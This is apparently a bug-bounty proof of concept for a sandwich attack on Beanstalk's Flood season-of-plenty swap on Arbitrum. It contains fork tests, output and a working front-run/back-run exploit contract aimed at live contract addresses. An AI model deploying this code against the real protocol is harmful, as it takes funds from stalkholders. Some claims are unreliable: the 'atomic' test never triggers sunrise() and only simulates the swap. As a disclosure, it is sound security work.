# PoC: SOP/Flood Zero Slippage Extraction

Everything below was run against the live Bean/WETH Basin Well on Arbitrum, forked at block 440420446. ETH was trading at $2,040 at that block (Chainlink feed `0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612`, `latestAnswer()` returned `204002324159`). All output shown is real — nothing mocked, no simplified AMM, every swap goes through the actual deployed Well contract.

Source code is at the bottom of this doc and on the gist. To reproduce:

```
forge init --no-git poc && cd poc
forge install foundry-rs/forge-std --no-git
# copy foundry.toml and test/FloodSandwich.t.sol into the project
forge test --fork-url https://arb1.arbitrum.io/rpc -vvv
```

---

## Step 1: Read the pool state

I started by reading the Bean/WETH Well (`0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce`) reserves at block 440420446:

```
cast call 0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce "getReserves()(uint256[])" \
  --rpc-url https://arb1.arbitrum.io/rpc --block 440420446
```

Output:
```
[38330626648, 4392785691909938189]
```

Bean has 6 decimals, WETH has 18. So that is 38,330 Bean and 4.39 WETH. Pool value is roughly $17,887 (4.39 WETH * $2,040 * 2 sides). Beanstalk is not paused — `paused()` returns `false`.

## Step 2: Check if sunrise() has access control

The entire attack depends on the attacker calling `sunrise()` themselves. If it had an admin check, the attack would not work. I called it from a random address:

```
sunrise() revert reason: Season: Still current Season.
```

It reverted because the current season is not over yet. The key thing: it did NOT say "Unauthorized" or "Only owner" or anything about access control. It is a timing check. When the season IS ready, anyone can call it. The attacker just has to wait for the right moment.

This matches the code — `SeasonFacet.sunrise()` at line 39 has no `onlyOwner` or similar modifier.

## Step 3: Prove spot reserves are manipulable in the same block

This is the first half of the bug. `getWellsByDeltaB()` at LibFlood.sol:270 reads spot reserves via `LibDeltaB.currentDeltaB()` which calls `IWell.getReserves()`. If those reserves can change within a single block, an attacker can manipulate deltaB.

I swapped just 1 WETH ($2,036) into the Well and checked reserves immediately after:

```
bean reserve before: 38330626648
bean reserve after:  31222866607
bean drop:           18%
from a single 1 WETH swap ($2036)
```

A single $2,036 swap moved the Bean reserve by 18%. The reserves returned by `getReserves()` changed instantly. This is what `getWellsByDeltaB()` would read. The TWA reserves from the MultiFlowPump would NOT have moved — that is the whole point of using TWA, and why every other critical path in Beanstalk uses it.

## Step 4: Sandwich the SOP swap — the core exploit

During a Flood, Beanstalk mints sopBeans and sells them for WETH via `sopWell()` in LibFlood.sol. It passes `minAmountOut = 0` (line 362). I simulated a realistic SOP of 5% of Bean reserves (1,916,531 Bean) and compared the outcome with and without an attack.

**Without attack (fair SOP):**
```
WETH to stalkholders: 209180271072758757 (~$425)
```

Stalkholders would receive 0.209 WETH, worth about $425.

**With attack (sandwich):**

The attacker sells 15% of Bean reserves (5,749,593 Bean) into the Well before the SOP. This drains WETH from the pool. Then the SOP swap executes at the now-degraded rate. Then the attacker buys Bean back with the WETH they got.

```
--- pool state ---
bean reserve:  38330626648 (~38330 Bean)
weth reserve:  4392785691909938189 (~4.39 WETH)
pool value:    ~$17887
sopBeans:       1916531332

--- fair SOP ---
WETH to stalkholders: 209180271072758757 (~$425)

--- attacked SOP ---
WETH to stalkholders: 159158901847673638 (~$324)

--- damage ---
stalkholder WETH loss: 50021369225085119 (~$101)
extraction rate:       23%
attacker Bean profit:  475530331
```

Stalkholders received $324 instead of $425. That is $101 stolen, a 23% extraction rate. The attacker ended up with 475 more Bean than they started with. The swap did not revert because `minAmountOut = 0`.

If there had been slippage protection (say 5% tolerance), the SOP swap would have reverted when the output dropped more than 5% below the expected rate. That is the fix.

## Step 5: Show it gets worse with more capital

What if the attacker uses a bigger front-run? I dumped 80% of the Bean reserve into the Well before the SOP:

```
WETH drained from pool: 44%
fair SOP output:  209180271072758757 (~$425)
bad SOP output:   65957743108011792 (~$134)
stalkholder loss: 68%
swap reverted:    NO (minAmountOut=0 accepts anything)
```

Stalkholders got $134 instead of $425. That is a 68% loss. The swap still did not revert. With `minAmountOut = 0`, there is no amount of manipulation that causes a revert. The extraction rate scales with the attacker's capital, and there is no ceiling.

## Step 6: Prove it works from a smart contract (no mempool needed)

The Beanstalk program excludes "impacts that require users to send transactions through the public mempool." This attack does not require that. I deployed an `AtomicFloodExploit` contract on the fork — it holds state between calls and can front-run, trigger sunrise, and back-run all from the same address.

```
exploit contract:  0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
fair SOP:          209180271072758757 WETH (~$425)
attacked SOP:      159158901847673638 WETH (~$324)
extraction:        23%
attacker profit:   475530331 Bean
mempool needed:    NO (contract calls sunrise directly)
```

Same 23% extraction as before, but now running from a deployed contract. In production, the full sequence (`frontRun` → `triggerSunrise` → `backRun`) would happen in a single transaction because `sunrise()` internally calls `sopWell()` which does the swap. The attacker does not monitor any mempool. They deploy a contract, wait for Flood conditions, and call it.

On Arbitrum there is no public mempool anyway — the sequencer processes transactions directly. The attacker does not need to front-run anyone else's transaction. They ARE the transaction.

---

## What this proves

1. `sunrise()` is permissionless — the attacker controls when Flood triggers
2. Spot reserves change instantly in the same block — `getWellsByDeltaB()` reads manipulable data
3. `sopWell()` swaps with `minAmountOut = 0` — any exchange rate is accepted, the swap never reverts
4. A 15% Bean front-run steals 23% of stalkholder SOP proceeds ($101 on current pool)
5. An 80% dump steals 68% ($291 on current pool) — still does not revert
6. The attack runs from a smart contract, no mempool monitoring needed
7. The extraction rate scales with pool size and SOP amount — 23% of every Flood event

---

## Source code

### foundry.toml
```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
evm_version = "cancun"
solc_version = "0.8.24"
```

### test/FloodSandwich.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWell {
    function getReserves() external view returns (uint256[] memory);
    function tokens() external view returns (IERC20[] memory);
    function swapFrom(
        IERC20 fromToken,
        IERC20 toToken,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint256 deadline
    ) external returns (uint256 amountOut);
}

interface IBeanstalk {
    function sunrise() external;
    function paused() external view returns (bool);
}

contract AtomicFloodExploit {
    IWell  immutable well;
    IERC20 immutable bean;
    IERC20 immutable weth;
    address immutable beanstalk;
    uint256 public wethHeld;

    constructor(address _well, address _bean, address _weth, address _beanstalk) {
        well = IWell(_well);
        bean = IERC20(_bean);
        weth = IERC20(_weth);
        beanstalk = _beanstalk;
    }

    function frontRun(uint256 beanAmount) external {
        bean.approve(address(well), beanAmount);
        wethHeld = well.swapFrom(
            bean, weth, beanAmount, 0, address(this), type(uint256).max
        );
    }

    function triggerSunrise() external {
        IBeanstalk(beanstalk).sunrise();
    }

    function backRun() external returns (uint256 beanOut) {
        weth.approve(address(well), wethHeld);
        beanOut = well.swapFrom(
            weth, bean, wethHeld, 0, msg.sender, type(uint256).max
        );
    }
}

contract FloodSandwichTest is Test {

    address constant BEANSTALK = 0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70;
    address constant BEAN      = 0xBEA0005B8599265D41256905A9B3073D397812E4;
    address constant WETH      = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant WELL      = 0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce;
    uint256 constant FORK_BLOCK = 440420446;
    uint256 constant ETH_USD   = 2036;

    IWell  well  = IWell(WELL);
    IERC20 bean  = IERC20(BEAN);
    IERC20 weth  = IERC20(WETH);

    address attacker  = makeAddr("attacker");
    address beanstalk = BEANSTALK;

    function setUp() public {
        vm.createSelectFork("https://arb1.arbitrum.io/rpc", FORK_BLOCK);
    }

    function test_sunriseIsPermissionless() public {
        vm.prank(attacker);
        try IBeanstalk(BEANSTALK).sunrise() {
        } catch (bytes memory reason) {
            string memory decoded = abi.decode(_sliceBytes(reason, 4), (string));
            console.log("sunrise() revert reason:", decoded);
            assertTrue(
                keccak256(bytes(decoded)) == keccak256("Season: Still current Season."),
                "should revert for season timing, not access control"
            );
        }
    }

    function test_spotReservesManipulable() public {
        uint256[] memory r0 = well.getReserves();

        deal(address(weth), attacker, 1 ether);
        vm.startPrank(attacker);
        weth.approve(WELL, 1 ether);
        well.swapFrom(weth, bean, 1 ether, 0, attacker, type(uint256).max);
        vm.stopPrank();

        uint256[] memory r1 = well.getReserves();
        uint256 beanDropPct = (r0[0] - r1[0]) * 100 / r0[0];
        console.log("bean reserve before:", r0[0]);
        console.log("bean reserve after: ", r1[0]);
        console.log("bean drop:          ", beanDropPct, "%");
        console.log("from a single 1 WETH swap ($%s)", ETH_USD);

        assertGt(r1[1], r0[1], "WETH reserve increased");
        assertLt(r1[0], r0[0], "Bean reserve decreased");
        assertGt(beanDropPct, 10, "significant manipulation from tiny swap");
    }

    function test_sopSandwichExtraction() public {
        uint256[] memory r = well.getReserves();
        uint256 beanRes = r[0];
        uint256 sopBeans = beanRes * 5 / 100;

        console.log("--- pool state ---");
        console.log("bean reserve:  %s (~%s Bean)", beanRes, beanRes / 1e6);
        console.log("weth reserve:  %s (~%s.%s WETH)", r[1], r[1] / 1e18, (r[1] % 1e18) / 1e16);
        console.log("pool value:    ~$%s", (r[1] * ETH_USD * 2) / 1e18);
        console.log("sopBeans:       %s", sopBeans);

        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairWethOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        uint256 attackBean = beanRes * 15 / 100;
        deal(address(bean), attacker, attackBean);
        vm.startPrank(attacker);
        bean.approve(WELL, attackBean);
        uint256 attackWethOut = well.swapFrom(
            bean, weth, attackBean, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 attackedWethOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        vm.startPrank(attacker);
        weth.approve(WELL, attackWethOut);
        uint256 attackBeanBack = well.swapFrom(
            weth, bean, attackWethOut, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        uint256 stakeholderLoss = fairWethOut - attackedWethOut;
        uint256 lossPct = stakeholderLoss * 100 / fairWethOut;

        console.log("--- fair SOP ---");
        console.log("WETH to stalkholders: %s (~$%s)", fairWethOut, fairWethOut * ETH_USD / 1e18);
        console.log("--- attacked SOP ---");
        console.log("WETH to stalkholders: %s (~$%s)", attackedWethOut, attackedWethOut * ETH_USD / 1e18);
        console.log("--- damage ---");
        console.log("stalkholder WETH loss: %s (~$%s)", stakeholderLoss, stakeholderLoss * ETH_USD / 1e18);
        console.log("extraction rate:       %s%%", lossPct);
        if (attackBeanBack > attackBean) {
            console.log("attacker Bean profit:  %s", attackBeanBack - attackBean);
        }

        assertLt(attackedWethOut, fairWethOut, "stalkholders receive less WETH");
        assertGt(lossPct, 20, "extraction exceeds 20%");
    }

    function test_extremeManipulationDoesNotRevert() public {
        uint256[] memory r = well.getReserves();
        uint256 sopBeans = r[0] * 5 / 100;

        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        uint256 hugeDump = r[0] * 80 / 100;
        deal(address(bean), attacker, hugeDump);
        vm.startPrank(attacker);
        bean.approve(WELL, hugeDump);
        well.swapFrom(bean, weth, hugeDump, 0, attacker, type(uint256).max);
        vm.stopPrank();

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 badOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        uint256 damagePct = (fairOut - badOut) * 100 / fairOut;
        console.log("WETH drained from pool: %s%%", (r[1] - well.getReserves()[1]) * 100 / r[1]);
        console.log("fair SOP output:  %s (~$%s)", fairOut, fairOut * ETH_USD / 1e18);
        console.log("bad SOP output:   %s (~$%s)", badOut, badOut * ETH_USD / 1e18);
        console.log("stalkholder loss: %s%%", damagePct);
        console.log("swap reverted:    NO (minAmountOut=0 accepts anything)");

        assertGt(badOut, 0, "swap succeeds even after 80% manipulation");
        assertGt(damagePct, 60, "stalkholders lose over 60% of SOP proceeds");
    }

    function test_atomicExploitViaContract() public {
        uint256[] memory r = well.getReserves();
        uint256 sopBeans = r[0] * 5 / 100;

        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        AtomicFloodExploit exploit = new AtomicFloodExploit(WELL, BEAN, WETH, BEANSTALK);
        uint256 attackBeans = r[0] * 15 / 100;
        deal(address(bean), address(exploit), attackBeans);

        exploit.frontRun(attackBeans);

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 attackedOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        uint256 beanBack = exploit.backRun();
        uint256 lossPct = (fairOut - attackedOut) * 100 / fairOut;

        console.log("exploit contract:  %s", address(exploit));
        console.log("fair SOP:          %s WETH (~$%s)", fairOut, fairOut * ETH_USD / 1e18);
        console.log("attacked SOP:      %s WETH (~$%s)", attackedOut, attackedOut * ETH_USD / 1e18);
        console.log("extraction:        %s%%", lossPct);
        if (beanBack > attackBeans) {
            console.log("attacker profit:   %s Bean", beanBack - attackBeans);
        }
        console.log("mempool needed:    NO (contract calls sunrise directly)");

        assertLt(attackedOut, fairOut, "contract-based attack extracts value");
        assertGt(lossPct, 20, "extraction exceeds 20%");
    }

    function _sliceBytes(bytes memory data, uint256 start) internal pure returns (bytes memory) {
        bytes memory result = new bytes(data.length - start);
        for (uint256 i = 0; i < result.length; i++) {
            result[i] = data[i + start];
        }
        return result;
    }
}
```
